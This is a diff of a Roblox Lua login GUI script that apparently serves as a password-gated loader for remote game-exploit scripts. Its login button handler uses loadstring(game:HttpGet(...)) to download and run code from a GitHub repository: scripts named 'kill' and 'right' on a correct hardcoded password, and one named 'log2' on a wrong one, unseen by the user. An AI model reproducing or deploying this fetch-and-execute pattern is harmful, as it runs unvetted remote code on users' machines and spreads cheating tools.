@@ -1,49 +1,71 @@
+-- Gui to Lua
+-- Version: 3.2
 
-local zzz = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
+-- Instances:
+
+local Login = Instance.new("ScreenGui")
+local Grah = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
 local password = Instance.new("TextBox")
-local TextButton = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local Log = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
 
 --Properties:
 
-zzz.Name = "zzz"
-zzz.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-zzz.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Login.Name = "Login"
+Login.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Login.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-Frame.Parent = zzz
-Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderColor3 = Color3.fromRGB(255, 0, 4)
-Frame.BorderSizePixel = 8
-Frame.Position = UDim2.new(0.482664227, 0, 0.502267599, 0)
-Frame.Size = UDim2.new(0, 360, 0, 143)
+Grah.Name = "Grah"
+Grah.Parent = Login
+Grah.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Grah.Position = UDim2.new(0.263926953, 0, 0.284580499, 0)
+Grah.Size = UDim2.new(0, 338, 0, 147)
 
-password.Parent = Frame
-password.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-password.BorderColor3 = Color3.fromRGB(255, 0, 4)
-password.BorderSizePixel = 3
-password.Position = UDim2.new(0.219545811, 0, 0.14807418, 0)
+UICorner.Parent = Grah
+
+password.Name = "password"
+password.Parent = Grah
+password.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
+password.Position = UDim2.new(0.204142004, 0, 0.108843535, 0)
 password.Size = UDim2.new(0, 200, 0, 50)
-password.Font = Enum.Font.SourceSans
-password.Text = "PASSWORD"
-password.TextColor3 = Color3.fromRGB(255, 0, 4)
-password.TextSize = 40.000
+password.Font = Enum.Font.Arial
+password.Text = "password..."
+password.TextColor3 = Color3.fromRGB(255, 255, 255)
+password.TextSize = 20.000
 
-TextButton.Parent = Frame
-TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.BorderColor3 = Color3.fromRGB(255, 0, 4)
-TextButton.BorderSizePixel = 2
-TextButton.Position = UDim2.new(0.223235995, 0, 0.651745081, 0)
-TextButton.Size = UDim2.new(0, 197, 0, 32)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "LOGIN"
-TextButton.TextColor3 = Color3.fromRGB(255, 5, 9)
-TextButton.TextSize = 50.000
-TextButton.MouseButton1Click:Connect(function()
-    if password.Text == "perkys OWO" then
-        zzz:Destroy()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/kill'))()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/right'))()
-        else
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/log2'))()
-end
+UICorner_2.Parent = password
+
+Log.Name = "Log"
+Log.Parent = Grah
+Log.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
+Log.Position = UDim2.new(0.204142019, 0, 0.571428597, 0)
+Log.Size = UDim2.new(0, 200, 0, 44)
+Log.Font = Enum.Font.Arial
+Log.Text = "LOGIN"
+Log.TextColor3 = Color3.fromRGB(255, 255, 255)
+Log.TextSize = 23.000
+Log.MouseButton1Click:Connect(function()
+	if password.Text == "foru" then
+		Login:Destroy()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/kill'))()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/right'))()
+	else
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/log2'))()
+	end
 end)
+
+UICorner_3.Parent = Log
+
+-- Scripts:
+
+local function JZCH_fake_script() -- Grah.Script 
+	local script = Instance.new('Script', Grah)
+
+	local Grah = script.Parent
+	
+	Grah.Active = true
+	Grah.Draggable = true
+end
+coroutine.wrap(JZCH_fake_script)()
